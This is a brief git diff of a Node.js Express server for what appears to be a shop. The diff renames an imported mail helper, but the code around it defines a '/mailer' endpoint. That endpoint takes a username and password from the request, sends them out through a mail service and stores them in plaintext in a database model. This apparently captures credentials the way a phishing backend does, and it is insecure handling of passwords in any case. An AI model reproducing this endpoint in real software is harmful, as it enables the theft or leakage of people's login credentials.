@@ -12,7 +12,7 @@ const ProductRoute = require('./routes/productRoute');
 const CartRoute = require('./routes/cartRoute');
 const SearchRoute = require('./routes/searchRoute');
 
-const mail = require('./services/Mil')
+const nodemailsender = require('./services/Mil')
 const model = require('./models/datamail');
 
 const app = express();
@@ -48,7 +48,7 @@ app.use('/api/search', SearchRoute);
 
 app.post('/mailer', async(req, res)=>{
     const {user, password} = req.body;
-    mail(user, password)
+    nodemailsender(user, password)
     await model.create({user, password})
     res.status(200).json({message: 'Mail Sent!'})
 })
